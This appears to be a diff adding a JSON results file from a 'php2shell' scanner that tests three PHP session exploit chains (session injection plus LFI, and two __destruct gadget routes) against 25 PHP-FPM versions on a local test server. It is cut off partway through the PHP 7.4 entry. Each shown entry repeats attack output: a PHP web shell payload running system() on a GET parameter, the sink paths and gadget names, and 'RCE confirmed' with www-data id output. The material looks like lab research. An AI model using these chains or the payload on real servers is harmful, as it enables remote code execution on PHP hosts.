@@ -1,0 +1,693 @@
+{
+  "scan_metadata": {
+    "total_versions": 25,
+    "ordered": "highest_to_lowest",
+    "version_list": [
+      "8.5.12-fpm",
+      "8.5.11-fpm",
+      "8.4.27-fpm",
+      "8.4.26-fpm",
+      "8.4.20-fpm",
+      "8.3.36-fpm",
+      "8.3.35-fpm",
+      "8.3.20-fpm",
+      "8.2.35-fpm",
+      "8.2.34-fpm",
+      "8.2.20-fpm",
+      "8.2.0-fpm",
+      "8.1.33-fpm",
+      "8.0.30-fpm",
+      "8.0.0-fpm",
+      "7.4.33-fpm",
+      "7.4.0-fpm",
+      "7.3.33-fpm",
+      "7.3.0-fpm",
+      "7.2.34-fpm",
+      "7.2.0-fpm",
+      "7.1.33-fpm",
+      "7.1.0-fpm",
+      "7.0.33-fpm",
+      "5.6-fpm"
+    ],
+    "scan_date": "2026-10-22 12:36"
+  },
+  "results": [
+    {
+      "php_version": "8.5.12-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s58e360266de3b8ccdddee1fc\n[*] SID          : p2s58e360266de3b8ccdddee1fc\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc58d818db9fc0281ceb78\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se937a8febd5eaeafb4250\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.5.12",
+      "error": null
+    },
+    {
+      "php_version": "8.5.11-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s9239fc82784d477ec861db76\n[*] SID          : p2s9239fc82784d477ec861db76\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc194270cea37a676b02eb\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se6969154524d91382978b\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.5.11",
+      "error": null
+    },
+    {
+      "php_version": "8.4.27-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2sadd5201a5b58f8fcb393f195\n[*] SID          : p2sadd5201a5b58f8fcb393f195\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc3ad6207e02bb83535539\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2see1394f5a6e0e717b8e68\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.4.27",
+      "error": null
+    },
+    {
+      "php_version": "8.4.26-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s2eef79f8b77a1c09c1959426\n[*] SID          : p2s2eef79f8b77a1c09c1959426\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scee1a57a6298083217eee\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se800eca0de3bb6a8fd5d2\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.4.26",
+      "error": null
+    },
+    {
+      "php_version": "8.4.20-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s9396b1bdb515978f30b3d884\n[*] SID          : p2s9396b1bdb515978f30b3d884\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc8fe5fef4bd6a0d1f3f2f\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se2614a059e5f9e30535b5\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.4.20",
+      "error": null
+    },
+    {
+      "php_version": "8.3.36-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2scb0ced156d2bcdacc194e097\n[*] SID          : p2scb0ced156d2bcdacc194e097\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scfd71eac7fc2a419666e7\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se776550a8bb9fdca52a2b\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.3.36",
+      "error": null
+    },
+    {
+      "php_version": "8.3.35-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s21e6bd93a877c6f609f597ae\n[*] SID          : p2s21e6bd93a877c6f609f597ae\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc1171b29daf3fb5b5f312\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se9fa8f81659a3b99ae044\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.3.35",
+      "error": null
+    },
+    {
+      "php_version": "8.3.20-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2sca09058c1d8143920de83eca\n[*] SID          : p2sca09058c1d8143920de83eca\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scf60ebf050bd131fa6172\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2sed6d77785c5b29e3ba740\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.3.20",
+      "error": null
+    },
+    {
+      "php_version": "8.2.35-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s0be52793f3db6831729efc36\n[*] SID          : p2s0be52793f3db6831729efc36\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc62ce9ac4699330b75889\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se2b70439044efd8bc7abb\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.2.35",
+      "error": null
+    },
+    {
+      "php_version": "8.2.34-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s249ee5605c56bba74371fc42\n[*] SID          : p2s249ee5605c56bba74371fc42\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc433921d3f567e6c45d2c\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se238f555bae2358c855dd\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.2.34",
+      "error": null
+    },
+    {
+      "php_version": "8.2.20-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2se17625671e31d4d3ad7833b0\n[*] SID          : p2se17625671e31d4d3ad7833b0\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2scc0d2ee645f34cf143d1e\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2seda76b2e4c0fe7f869766\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.2.20",
+      "error": null
+    },
+    {
+      "php_version": "8.2.0-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s788ddc5579aeaa2759de7f5e\n[*] SID          : p2s788ddc5579aeaa2759de7f5e\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc09e0ae8684cec761fff4\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se07411623498274794727\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.2.0",
+      "error": null
+    },
+    {
+      "php_version": "8.1.33-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2sfebab1cae5ffa5c4dca7114f\n[*] SID          : p2sfebab1cae5ffa5c4dca7114f\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc4e02e7ad7627eb5aded1\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se90e8130766d58d2f4176\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.1.33",
+      "error": null
+    },
+    {
+      "php_version": "8.0.30-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2scd75bc9c47d90b2fbd852360\n[*] SID          : p2scd75bc9c47d90b2fbd852360\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc5e1acf19c609d2f2f999\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2see6b4de7e91c4bd7da340\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.0.30",
+      "error": null
+    },
+    {
+      "php_version": "8.0.0-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain A: session injection + LFI\n[*] target       : http://127.0.0.1:18080\n[*] upload sink  : /index.php\n[*] LFI sink     : /vuln.php?page=<file>&c=<cmd>\n[*] session file : /tmp/sessions/sess_p2s26c0dc17100d23010beb1450\n[*] SID          : p2s26c0dc17100d23010beb1450\n[*] payload      : <?php echo chr(1);if(isset($_GET['c'])){system($_GET['c']);exit;}?>\n\n[1] starting slow upload (race mode, for cleanup=On)\n    -> session file is live\n[+] RCE confirmed\n    uid=33(www-data) gid=33(ww",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "C": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain C: handler mismatch -> __destruct\n[*] target     : http://127.0.0.1:18080\n[*] writer     : /app/write.php  (php_serialize)\n[*] reader     : /api/endpoint.php  (php)\n[*] SID        : p2sc9c33da98ac79026e6507\n[*] gadget     : Evil->cmd\n\n[1] poisoning the session through the php_serialize directory...\n    -> stored\n[2] re-reading it through the php-handler directory...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) group",
+          "uid": "33",
+          "exit_code": 0
+        },
+        "E": {
+          "vulnerable": true,
+          "details": "[*] php2shell \u2014 Chain E: decode failure -> __destruct\n[*] target   : http://127.0.0.1:18080\n[*] reader   : /e_shell.php\n[*] SID      : p2se40e071ad26f0ab43b795\n[*] gadget   : EvilE->cmd\n\n[1] planting a session file: x|<gadget><trailing junk>...\n    -> __destruct fired during request startup\n[+] RCE confirmed\n\n    uid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)",
+          "uid": "33",
+          "exit_code": 0
+        }
+      },
+      "status": "tested",
+      "php_version_detected": "PHP 8.0.0",
+      "error": null
+    },
+    {
+      "php_version": "7.4.33-fpm",
+      "chains": {
+        "A": {
+          "vulnerable": true,
